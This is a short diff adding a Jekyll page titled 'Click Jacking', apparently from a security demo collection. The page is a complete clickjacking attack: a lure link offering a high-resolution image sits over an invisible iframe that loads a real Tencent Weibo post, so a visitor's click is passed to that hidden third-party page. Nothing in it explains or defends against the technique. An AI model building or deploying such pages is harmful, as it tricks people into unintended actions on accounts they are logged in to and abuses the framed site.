@@ -1,0 +1,14 @@
+---
+layout: demo
+title: Click Jacking
+category: demo
+---
+<style type="text/css">
+*{padding:0;margin:0;font-size:12px;}
+.bg{background:transparent url('http://t1.qpic.cn/mblogpic/9d5dfdbdf9a2a285626a/460') no-repeat scroll 0 0;width:500px;height:570px;position:relative;left:290px;}
+.bg a{position:absolute;top:457px;left:230px;}
+#iframe{position:absolute;top:166px;left:0;opacity:0;filter:alpha(opacity=0);}
+</style>
+<div class="bg"><a href="#">点此查看高清大图</a></div>
+
+<iframe id="iframe" src="http://t.qq.com/p/t/260415029623674" width="650" height="350" allowtransparency="true" frameborder="0" scrolling="no" ></iframe>
